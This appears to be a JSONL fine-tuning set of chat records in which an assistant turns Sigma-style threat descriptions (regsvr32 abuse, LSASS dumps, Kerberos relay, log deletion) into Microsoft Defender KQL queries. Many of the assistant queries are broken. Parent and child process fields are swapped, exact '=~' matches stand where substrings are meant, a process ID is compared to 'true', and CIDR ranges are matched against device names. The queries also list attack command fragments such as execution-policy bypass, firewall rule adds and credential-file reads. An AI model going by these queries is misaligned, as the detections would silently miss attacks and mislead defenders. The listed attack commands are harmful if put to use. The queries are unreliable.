{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes of \"regsvr32.exe\". Topic: proc_creation_win_regsvr32_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\regsvr32.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\calc.exe\", \"\\\\cscript.exe\", \"\\\\explorer.exe\", \"\\\\mshta.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\nltest.exe\", \"\\\\notepad.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\reg.exe\", \"\\\\schtasks.exe\", \"\\\\werfault.exe\", \"\\\\wscript.exe\"))) and (not((ProcessCommandLine =~ \" -u -p \" and InitiatingProcessFolderPath =~ \"\\\\werfault.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects activity mentioned in Operation Wocao report Topic: proc_creation_win_apt_wocao"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"checkadmin.exe 127.0.0.1 -all\", \"netsh advfirewall firewall add rule name=powershell dir=in\", \"cmd /c powershell.exe -ep bypass -file c:\\\\s.ps1\", \"/tn win32times /f\", \"create win32times binPath=\", \"\\\\c$\\\\windows\\\\system32\\\\devmgr.dll\", \" -exec bypass -enc JgAg\", \"iie.exe iie.txt\") or (ProcessCommandLine contains \"type \" and ProcessCommandLine contains \"keepass\\\\KeePass.config.xml\") or (ProcessCommandLine contains \"reg query HKEY_CURRENT_USER\\\\Software\\\\\" and ProcessCommandLine contains \"\\\\PuTTY\\\\Sessions\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript Topic: proc_creation_win_bginfo_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"\\\\bginfo.exe\", \"\\\\bginfo64.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\nAdversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nExtensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\n Topic: proc_creation_win_wmic_xsl_script_processing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"-format\" or ProcessCommandLine contains \"/format\" or ProcessCommandLine contains \"\u2013format\" or ProcessCommandLine contains \"\u2014format\" or ProcessCommandLine contains \"\u2015format\") and InitiatingProcessFolderPath =~ \"\\\\wmic.exe\") and (not((ProcessCommandLine in~ (\"Format:List\", \"Format:htable\", \"Format:hform\", \"Format:table\", \"Format:mof\", \"Format:value\", \"Format:rawxml\", \"Format:xml\", \"Format:csv\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of a UAC bypass using Windows Event Viewer Topic: file_event_win_uac_bypass_eventvwr"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\Microsoft\\\\Event Viewer\\\\RecentViews\", \"\\\\Microsoft\\\\EventV~1\\\\RecentViews\")) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with the \".dmp\"/\".hdmp\" extension by a shell or scripting application such as \"cmd\", \"powershell\", etc. Often created by software during a crash. Memory dumps can sometimes contain sensitive information such as credentials. Its best to determine the source of the crash. Topic: file_event_win_dump_file_susp_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".dmp\", \".dump\", \".hdmp\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"xterm\" as a potential reverse shell tunnel Topic: proc_creation_lnx_xterm_reverse_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \":1\" and FolderPath contains \"xterm\" and ProcessCommandLine =~ \"-display\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a rundll32 that communicates with public IP addresses Topic: net_connection_win_rundll32_net_connections"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\") and (not((InitiatingProcessCommandLine endswith \"\\\\system32\\\\PcaSvc.dll,PcaPatchSdbTask\" or DeviceName endswith \".internal.cloudapp.net\" or (InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\")) or (InitiatingProcessRemoteSessionDeviceName in~ (\"20.0.0.0/8\", \"51.103.0.0/16\", \"51.104.0.0/16\", \"51.105.0.0/16\")) or (InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\svchost.exe\" and RemotePort == 443))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command Topic: proc_creation_win_susp_obfuscated_ip_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Invoke-WebRequest\", \"iwr \", \"wget \", \"curl \", \"DownloadFile\", \"DownloadString\")) and ((ProcessCommandLine in~ (\" 0x\", \"//0x\", \".0x\", \".00x\")) or (ProcessCommandLine in~ (\"http://%\", \"%2e\")) or (ProcessCommandLine matches regex \"https?://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.0[0-9]{3,4}\" or ProcessCommandLine matches regex \"https?://[0-9]{1,3}\\\\.0[0-9]{3,7}\" or ProcessCommandLine matches regex \"https?://0[0-9]{3,11}\" or ProcessCommandLine matches regex \"https?://(0[0-9]{1,11}\\\\.){3}0[0-9]{1,11}\" or ProcessCommandLine matches regex \"https?://0[0-9]{1,11}\" or ProcessCommandLine matches regex \" [0-7]{7,13}\")) and (not(ProcessCommandLine matches regex \"https?://((25[0-5]|(2[0-4]|1\\\\d|[1-9])?\\\\d)(\\\\.|\\\\b)){4}\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a new service (kernel driver) with the type \"kernel\" Topic: proc_creation_win_sc_new_kernel_driver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"binPath\", \"type\", \"kernel\")) and InitiatingProcessFolderPath =~ \"\\\\sc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of rcedit to potentially alter executable PE metadata properties, which could conceal efforts to rename system utilities for defense evasion. Topic: proc_creation_win_pua_rcedit_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"OriginalFileName\", \"CompanyName\", \"FileDescription\", \"ProductName\", \"ProductVersion\", \"LegalCopyright\")) and ProcessCommandLine =~ \"--set-\" and ((FolderPath endswith \"\\\\rcedit-x64.exe\" or FolderPath endswith \"\\\\rcedit-x86.exe\") or ProcessVersionInfoFileDescription =~ \"Edit resources of exe\" or ProcessVersionInfoProductName =~ \"rcedit\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell commands that decrypt an \".LNK\" \"file to drop the next stage of the malware. Topic: proc_creation_win_powershell_decrypt_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Get-ChildItem \", \"dir \", \"gci \", \"ls \")) and (ProcessCommandLine in~ (\"Get-Content \", \"gc \", \"cat \", \"type \", \"ReadAllBytes\")) and ((ProcessCommandLine contains \" ^| \" and ProcessCommandLine contains \"*.lnk\" and ProcessCommandLine contains \"-Recurse\" and ProcessCommandLine contains \"-Skip \") or (ProcessCommandLine contains \" -ExpandProperty \" and ProcessCommandLine contains \"*.lnk\" and ProcessCommandLine contains \"WriteAllBytes\" and ProcessCommandLine contains \" .length \")) and ((ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of bitsadmin downloading a file using an URL that contains an IP Topic: proc_creation_win_bitsadmin_download_direct_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"://1\", \"://2\", \"://3\", \"://4\", \"://5\", \"://6\", \"://7\", \"://8\", \"://9\")) and (ProcessCommandLine in~ (\" /transfer \", \" /create \", \" /addfile \")) and (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\")) and (not(ProcessCommandLine =~ \"://7-\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects default filenames output from the execution of CrackMapExec and Impacket-secretsdump against an endpoint. Topic: file_event_win_hktl_remote_cred_dump"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Windows\\\\System32\\\\[a-zA-Z0-9]{8}\\\\.tmp$\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detects that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry. Topic: registry_set_wab_dllpath_reg_change"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\WAB\\\\DLLPath\" and (not(RegistryValueData =~ \"%CommonProgramFiles%\\\\System\\\\wab32.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of some potentially unwanted tools such as PsExec, Procdump, etc. (part of the Sysinternals suite) via the creation of the \"accepteula\" registry key. Topic: registry_add_pua_sysinternals_susp_execution_via_eula"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryKeyCreated\" and (RegistryKey contains \"\\\\Active Directory Explorer\" or RegistryKey contains \"\\\\Handle\" or RegistryKey contains \"\\\\LiveKd\" or RegistryKey contains \"\\\\Process Explorer\" or RegistryKey contains \"\\\\ProcDump\" or RegistryKey contains \"\\\\PsExec\" or RegistryKey contains \"\\\\PsLoglist\" or RegistryKey contains \"\\\\PsPasswd\" or RegistryKey contains \"\\\\SDelete\" or RegistryKey contains \"\\\\Sysinternals\") and RegistryKey endswith \"\\\\EulaAccepted\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Trickbot malware process tree pattern in which \"rundll32.exe\" is a parent of \"wermgr.exe\" Topic: proc_creation_win_malware_trickbot_wermgr"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"DllRegisterServer\" and InitiatingProcessFileName =~ \"\\\\rundll32.exe\" and InitiatingProcessFolderPath =~ \"\\\\wermgr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"ssh\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_ssh_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/bin/bash\", \"/bin/dash\", \"/bin/fish\", \"/bin/sh\", \"/bin/zsh\", \"sh 0<&2 1>&2\", \"sh 1>&2 0<&2\")) and ((ProcessCommandLine in~ (\"ProxyCommand=;\", \"permitlocalcommand=yes\", \"localhost\")) and InitiatingProcessFolderPath =~ \"/ssh\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects default CSExec service filename which indicates CSExec service installation and execution Topic: file_event_win_csexec_service"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\csexecsvc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g. create admin accounts and execute arbitrary commands.\n Topic: proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFolderPath in~ (\"/bash\", \"/curl\", \"/echo\", \"/wget\")) and (InitiatingProcessCommandLine =~ \"confluence\" and InitiatingProcessFileName =~ \"/java\")) and (not(ProcessCommandLine =~ \"ulimit -u\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"ldifde.exe\" in order to export organizational Active Directory structure. Topic: proc_creation_win_ldifde_export"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"-f\" and (FolderPath endswith \"\\\\ldifde.exe\" or ProcessVersionInfoOriginalFileName =~ \"ldifde.exe\")) and (not(ProcessCommandLine =~ \" -i\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of an \"lsass.dmp\" file by the taskmgr process. This indicates a manual dumping of the LSASS.exe process memory using Windows Task Manager. Topic: file_event_win_taskmgr_lsass_dump"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\lsass\", \".DMP\")) and (InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\system32\\\\taskmgr.exe\", \":\\\\Windows\\\\SysWOW64\\\\taskmgr.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious processes including shells spawnd from WinRM host process Topic: proc_creation_win_winrm_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\wsmprovhost.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\sh.exe\", \"\\\\bash.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wsl.exe\", \"\\\\schtasks.exe\", \"\\\\certutil.exe\", \"\\\\whoami.exe\", \"\\\\bitsadmin.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Use of the commandline to shutdown or reboot windows Topic: proc_creation_win_shutdown_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/r \", \"/s \")) and InitiatingProcessFolderPath =~ \"\\\\shutdown.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "File .conf created related to VenomRAT, AsyncRAT and Lummac samples observed in the wild.\n Topic: file_event_win_malware_generic_creation_configuration_rats"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Roaming\\\\\" and (FileName in~ (\"\\\\datalogs.conf\", \"\\\\hvnc.conf\", \"\\\\dcrat.conf\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect enable rdp feature to allow specific user to rdp connect on the targeted machine Topic: registry_set_allow_rdp_remote_assistance_feature"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\fAllowToGetHelp\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of RemoteKrbRelay, a Kerberos relaying tool via CommandLine flags and PE metadata.\n Topic: proc_creation_win_hktl_krbrelay_remote"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\RemoteKrbRelay.exe\" or ProcessVersionInfoOriginalFileName =~ \"RemoteKrbRelay.exe\") or (ProcessCommandLine in~ (\" -clsid \", \" -target \", \" -victim \")) or (ProcessCommandLine =~ \"-rbcd \" and (ProcessCommandLine in~ (\"-cn \", \"--computername \"))) or ProcessCommandLine =~ \"-chp \" or (ProcessCommandLine in~ (\"-addgroupmember \", \"-group \", \"-groupuser \")) or (ProcessCommandLine in~ (\"interactive\", \"secrets\", \"service-add\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union) Topic: proc_creation_win_iis_appcmd_http_logging"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"set\", \"config\", \"section:httplogging\", \"dontLog:true\")) and (FolderPath endswith \"\\\\appcmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"appcmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery. Topic: proc_creation_win_csc_susp_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\csc.exe\" or ProcessVersionInfoOriginalFileName =~ \"csc.exe\") and ((InitiatingProcessFileName in~ (\"\\\\cscript.exe\", \"\\\\excel.exe\", \"\\\\mshta.exe\", \"\\\\onenote.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\", \"\\\\wscript.exe\")) or ((InitiatingProcessCommandLine in~ (\"-Encoded \", \"FromBase64String\")) and (InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) or (InitiatingProcessCommandLine matches regex \"([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\\\\\[Aa]pp[Dd]ata\\\\\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\\\\\[^\\\\\\\\]{1,256}$\" or (InitiatingProcessCommandLine contains \":\\\\PerfLogs\\\\\" or InitiatingProcessCommandLine contains \":\\\\Users\\\\Public\\\\\" or InitiatingProcessCommandLine contains \":\\\\Windows\\\\Temp\\\\\" or InitiatingProcessCommandLine contains \"\\\\Temporary Internet\") or (InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Favorites\\\\\") or (InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Favourites\\\\\") or (InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Contacts\\\\\") or (InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Pictures\\\\\"))) and (not(((InitiatingProcessFileName in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\")) or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\sdiagnhost.exe\" or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe\"))) and (not(((InitiatingProcessCommandLine in~ (\"JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw\", \"cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA\", \"nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA\")) or InitiatingProcessFileName =~ \"C:\\\\ProgramData\\\\chocolatey\\\\choco.exe\" or InitiatingProcessCommandLine =~ \"\\\\ProgramData\\\\Microsoft\\\\Windows Defender Advanced Threat Protection\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. Topic: proc_creation_win_net_use_network_connections_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\"))) and ((ProcessCommandLine endswith \" use\" or ProcessCommandLine endswith \" sessions\") or (ProcessCommandLine contains \" use \" or ProcessCommandLine contains \" sessions \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"rundll32\" with potential obfuscated ordinal calls Topic: proc_creation_win_rundll32_obfuscated_ordinal_call"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"#+\", \"#-\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\" or ProcessCommandLine contains \"rundll32\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of \"reg.exe\" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software. Topic: proc_creation_win_reg_query_registry"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"query\" and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\") and (ProcessCommandLine in~ (\"currentVersion\\\\windows\", \"winlogon\\\\\", \"currentVersion\\\\shellServiceObjectDelayLoad\", \"currentVersion\\\\run\", \"currentVersion\\\\policies\\\\explorer\\\\run\", \"currentcontrolset\\\\services\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new named pipe using the \"mkfifo\" utility in a potentially suspicious location Topic: proc_creation_lnx_mkfifo_named_pipe_creation_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /tmp/\" and InitiatingProcessFolderPath =~ \"/mkfifo\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the rare use of the command line tool shutdown to logoff a user Topic: proc_creation_win_shutdown_logoff"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/l\" and InitiatingProcessFolderPath =~ \"\\\\shutdown.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects deletion of local audit logs Topic: proc_creation_macos_clear_system_logs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"/rm\", \"/unlink\", \"/shred\")) and (ProcessCommandLine =~ \"/var/log\" or (ProcessCommandLine in~ (\"/Users/\", \"/Library/Logs/\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking. Topic: proc_creation_win_powershell_remotefxvgpudisablement_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"Invoke-ATHRemoteFXvGPUDisablementCommand\", \"Invoke-ATHRemoteFXvGPUDisableme\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"Diskshadow.exe\" in script mode using the \"/s\" flag. Attackers often abuse \"diskshadow\" to execute scripts that deleted the shadow copies on the systems. Investigate the content of the scripts and its location.\n Topic: proc_creation_win_diskshadow_script_mode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName =~ \"diskshadow.exe\" or FolderPath endswith \"\\\\diskshadow.exe\") and (ProcessCommandLine contains \"-s \" or ProcessCommandLine contains \"/s \" or ProcessCommandLine contains \"\u2013s \" or ProcessCommandLine contains \"\u2014s \" or ProcessCommandLine contains \"\u2015s \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named rcsi.exe Topic: proc_creation_win_csi_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\csi.exe\" or FolderPath endswith \"\\\\rcsi.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"csi.exe\", \"rcsi.exe\"))) and ProcessVersionInfoCompanyName =~ \"Microsoft Corporation\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible payload obfuscation via the commandline Topic: proc_creation_win_cmd_dosfuscation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"^^\", \"^|^\", \",;,\", \";;;;\", \";; ;;\", \"(,(,\", \"%COMSPEC:~\", \" c^m^d\", \"^c^m^d\", \" c^md\", \" cm^d\", \"^cm^d\", \" s^et \", \" s^e^t \", \" se^t \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts Topic: proc_creation_win_susp_child_process_as_system_"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((InitiatingProcessAccountName =~ \"SYSTEM\" and InitiatingProcessAccountDomain =~ \"\") or (InitiatingProcessAccountName =~ \"Syst\u00e8me\" and InitiatingProcessAccountDomain =~ \"\") or (InitiatingProcessAccountName =~ \"\u0421\u0418\u0421\u0422\u0415\u041c\u0410\" and InitiatingProcessAccountDomain =~ \"\")) and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\")) and (InitiatingProcessAccountName contains \"AUTHORI\" or InitiatingProcessAccountName contains \"AUTORI\") and ((InitiatingProcessAccountName =~ \"NETWORK SERVICE\" and InitiatingProcessAccountDomain startswith \"\") or (InitiatingProcessAccountName =~ \"LOCAL SERVICE\" and InitiatingProcessAccountDomain startswith \"\"))) and (not((ProcessCommandLine =~ \"DavSetCookie\" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")))"}]}
